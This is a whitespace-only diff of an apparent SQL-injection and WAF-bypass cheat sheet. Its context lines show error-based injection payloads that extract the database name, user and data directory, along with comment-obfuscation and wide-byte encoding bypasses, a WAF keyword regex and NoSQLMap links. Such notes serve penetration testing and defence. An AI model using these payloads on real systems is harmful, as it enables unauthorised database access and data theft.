@@ -8,7 +8,7 @@ Easy2Sqlmap,Hard2Bypass
 
 Framework & Waf
 
-laravel  pdo function 
+laravel  pdo function
 regex
 \b(ALTER|CREATE|DELETE|DROP|EXEC(UTE){0,1}|INSERT( +INTO){0,1}|MERGE|SELECT|UPDATE|UNION( +ALL){0,1})\b
 
@@ -59,7 +59,7 @@ index.php?id=1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadi
 
 
 google dork
-SqlInjectType: 
+SqlInjectType:
 In-band SQLi (Classic SQLi)
 Error-based SQLi
 id=4' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178787671,(SELECT (ELT(2556=2556,1))),0x71627a6a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'JOtO'='JOtO
@@ -157,7 +157,7 @@ BETWEEN	在某个范围内
 LIKE	搜索某种模式
 IN	指定针对某个列的多个可能值
 
-ORDER BY 
+ORDER BY
 FUNCTIONS count min max sum …
 AS
 EXISTS
@@ -215,7 +215,7 @@ filter
 
 and/
 
-and 
+and
 
 /*%"!/*/and/*%"!/*/
 /*%"/!*/select
@@ -269,7 +269,7 @@ sqlmap critical
 空字符
 宽字符
 冗余流量
-注释 /*  */  -- # 
+注释 /*  */  -- #
 inline注释 /*!version  code  */
 URL encode
 ‘ -> %df%27
@@ -385,5 +385,3 @@ https://github.com/codingo/NoSQLMap
 NoSqlMap
 https://github.com/codingo/NoSQLMap
 ```
-
-
